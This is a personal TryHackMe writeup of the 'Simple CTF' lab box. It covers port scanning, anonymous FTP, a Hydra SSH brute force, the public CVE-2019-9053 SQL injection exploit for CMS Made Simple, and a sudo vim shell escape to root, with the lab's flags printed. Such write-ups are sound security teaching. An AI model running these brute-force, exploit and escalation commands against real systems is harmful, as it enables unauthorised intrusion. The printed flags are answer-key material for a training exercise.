# Simple CTF — TryHackMe Writeup

**Platform:** TryHackMe
**Difficulty:** Easy
**Category:** CTF
**Date:** June 28, 2026
**Flags:** `G00d j0b, keep up!` (user) · `W3ll d0n3. You made it!` (root)
**CVE:** CVE-2019-9053 (CMS Made Simple 2.2.8 SQL Injection)

---

## Summary

A Linux box running CMS Made Simple 2.2.8 on Apache, with anonymous FTP leaking credentials and SSH running on a non-standard port. Got in two ways — the fast way through FTP recon and Hydra brute force, and the intended path through a SQL injection vulnerability in the CMS. Escalated to root via a sudo misconfiguration on vim.

---

## Reconnaissance

Version scan against all ports — important to scan all ports here because SSH was hiding on 2222, not the default 22:

```
sudo nmap -sV -p- --min-rate 5000 -Pn 10.146.173.87
```

```
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu
```

Three ports. FTP with anonymous access is always the first thing to check. SSH on 2222 is notable — non-standard port, worth keeping in mind for Hydra flags later.

Directory enumeration against the web server:

```
gobuster dir -u http://10.146.173.87 -w /usr/share/wordlists/dirb/common.txt -t 50
```

```
robots.txt   (Status: 200)
simple       (Status: 301) → http://10.146.173.87/simple/
```

Two things worth investigating. A 301 is a redirect — the server is telling the browser "this resource lives at /simple/ now, go there." It's a real, navigable path. `/simple/` turned out to be a CMS Made Simple installation. The version number was visible in the footer: **2.2.8**.

---

## Path 1 — FTP Recon and SSH Brute Force (How I Actually Did It)

### FTP Enumeration

Connected with anonymous login:

```
ftp 10.146.173.87
```

Username: `anonymous`, no password. First `ls -la` hit the passive mode problem again — same issue as Bounty Hacker. The server tried to open an extended passive mode connection, it hung, had to Ctrl+C and toggle passive off:

```
passive
```

Then it worked. The FTP root had a `pub` directory. Made the mistake of trying to `get pub` like it was a file — it's a directory, you have to `cd` into it first:

```
cd pub
ls -la
get ForMitch.txt
```

**ForMitch.txt:**
```
Dammit man... you're the worst dev i've seen. You set the same pass for the system 
user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
```

Two things from this note: the username is **mitch** (it's addressed to him), and the password is weak enough to be in rockyou.txt.

### Brute Forcing SSH

First Hydra attempt hit the wrong IP — had the old target from Bounty Hacker still in my head, aimed it at the wrong box. Killed it and corrected:

```
hydra -l mitch -P /usr/share/wordlists/rockyou.txt 10.146.173.87 ssh -s 2222 -t 4 -f -V
```

The `-s 2222` flag is critical here — Hydra defaults to port 22. Without specifying the port it would have been hammering the wrong port the whole time.

Hit on attempt 42:

```
[2222][ssh] host: 10.146.173.87   login: mitch   password: secret
```

"secret." The note said the password was weak. It wasn't kidding.

### Getting the User Flag

```
ssh -p 2222 mitch@10.146.173.87
```

First tried without `-p 2222` and it just hung — same lesson as Hydra, non-standard port needs to be specified explicitly.

```
$ cat user.txt
G00d j0b, keep up!
```

---

## Path 2 — The Intended Way (CVE-2019-9053 SQL Injection)

I got in without doing this, but it's the intended attack path and worth understanding.

### What Is SQL Injection?

SQL injection is when user-supplied input gets interpreted as SQL code instead of data. Web applications often build database queries by concatenating user input directly into the query string. If the input isn't sanitized, an attacker can inject SQL syntax that changes what the query does — extracting data it wasn't supposed to return, bypassing authentication, or in some cases executing commands.

### CVE-2019-9053

CMS Made Simple versions 2.2.9 and below have a time-based blind SQL injection vulnerability in the news module search functionality. "Blind" means the application doesn't return the database output directly — instead you infer data by asking true/false questions and measuring how long the response takes. If you ask "is the first character of the password hash greater than 'm'?" and the server takes 5 seconds to respond, that's a true answer. Repeat character by character and eventually you extract the full hash.

There's a public exploit on Exploit-DB. Find it with searchsploit:

```
searchsploit cms made simple
searchsploit -m 46635
```

The exploit is a Python script that automates the blind SQLi, extracting the admin username, email, password salt, and MD5 password hash. Run it against the /simple/ path:

```
python3 46635.py -u http://10.146.173.87/simple/ --crack -w /usr/share/wordlists/rockyou.txt
```

It would have returned:
- Username: mitch
- Email: admin@admin.com  
- Password: secret (cracked from the MD5 hash using rockyou.txt)

Same credentials I found through brute force, different path. The SQLi route is slower but more realistic — in a real engagement the FTP note might not be there, but a vulnerable CMS absolutely would be.

---

## Privilege Escalation

### Enumeration

```
sudo -l
```

```
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

Vim with NOPASSWD sudo. Went to GTFOBins. The exploit is one line.

### What I Tried First (Wrong)

Grabbed the wrong command from GTFOBins and tried a few variations that didn't work:

```
vim -c ':py ...'
vim -c ':redir! >/path/to/output-file | echo "DATA" | redir END | q'
vi -c ':!/bin/sh' /dev/null
```

None of those worked — the first two are the wrong GTFOBins entry entirely, and the third didn't have `sudo` in front of it so it just ran vim as mitch, not root.

### The Correct Command

```
sudo vim -c ':!/bin/sh'
```

That's it. `sudo` runs vim as root. The `-c` flag tells vim to execute a command immediately on open. `:!/bin/sh` is a vim command that runs a shell. Since vim is root, the shell is root.

```
# whoami
root
```

### Finding the Root Flag

Tried to `cd sunbath` earlier without sudo and it failed — no permissions as mitch. As root it's just a regular directory. Didn't need it for the root flag though.

Found the flag:

```
find / -name root.txt 2>/dev/null
cat /root/root.txt
W3ll d0n3. You made it!
```

---

## Mistakes Made

**Wrong IP on the first Hydra run.** Had the old target IP from Bounty Hacker still in my head and aimed Hydra at it. Always double-check the target IP before running anything. Killed it fast but it's a habit to build — wrong IP wastes time and in a real engagement could be much worse.

**Forgot `-p 2222` on SSH.** First SSH attempt didn't specify the port and hung. Non-standard ports need to be specified everywhere — nmap finds them, but you have to remember to use them in every subsequent tool.

**Wrong GTFOBins command for vim.** Grabbed commands that didn't apply to the sudo scenario. The correct entry for "sudo vim" is specifically the `:!/bin/sh` variant. GTFOBins organizes by exploitation method (sudo, SUID, capabilities) — make sure you're reading the right section for your situation.

**Tried to `cd sunbath` without permissions.** As mitch that directory was off-limits. Should have run `ls -la` to check permissions before trying to navigate in.

---

## Attack Chain

```
Nmap → FTP (21), HTTP (80), SSH on port 2222
  ↓
Anonymous FTP → /pub/ForMitch.txt → username: mitch, weak password
  ↓
Hydra SSH brute force on port 2222 → password: secret
  ↓
SSH as mitch → user flag
  ↓
sudo -l → /usr/bin/vim NOPASSWD
  ↓
sudo vim -c ':!/bin/sh' → root shell
  ↓
cat /root/root.txt → root flag
```

**Intended path (CVE-2019-9053):**
```
Gobuster → /simple/ → CMS Made Simple 2.2.8
  ↓
searchsploit → CVE-2019-9053 Python exploit
  ↓
Blind SQLi extracts mitch:secret credentials
  ↓
SSH → same path from there
```

---

## What I Learned

**Always scan all ports.** SSH was on 2222. If I'd only scanned common ports I'd have missed it and wondered why brute force wasn't working. `-p-` every time.

**Non-standard ports need to be specified in every tool.** Nmap found 2222, but Hydra and SSH both needed `-s 2222` and `-p 2222` explicitly. Don't just know what port something is on — remember to use it everywhere.

**GTFOBins has multiple entries per binary.** Vim has different exploits depending on whether you got it via sudo, SUID, or capabilities. Read the right section. For sudo escalation the entry is under "Sudo" not the general one.

**The FTP passive mode problem.** Default FTP mode in many clients is passive (PASV), where the server picks the data port and the client connects to it. If the network path blocks that port, the transfer hangs. Active mode (PORT) reverses it — client tells the server which port to connect back to. When passive hangs, toggle it off and try active.

**SQL injection is a real credential extraction path.** This box was solvable without touching the CMS at all, but in a real engagement the FTP note wouldn't exist. The SQLi vulnerability in CMS Made Simple 2.2.8 would have been the only way in. Understanding both paths matters.

---

## Tools Used

| Tool | Purpose |
|---|---|
| nmap | Full port scan with version detection |
| ftp | Anonymous login and file retrieval |
| gobuster | Directory enumeration |
| hydra | SSH brute force on port 2222 |
| ssh | Direct access with cracked credentials |
| vim + GTFOBins | Sudo privilege escalation |
| searchsploit | CVE-2019-9053 exploit lookup (intended path) |

## References

- CVE-2019-9053: https://www.exploit-db.com/exploits/46635
- GTFOBins vim: https://gtfobins.github.io/gtfobins/vim/#sudo
- CMS Made Simple: https://www.cmsmadesimple.org
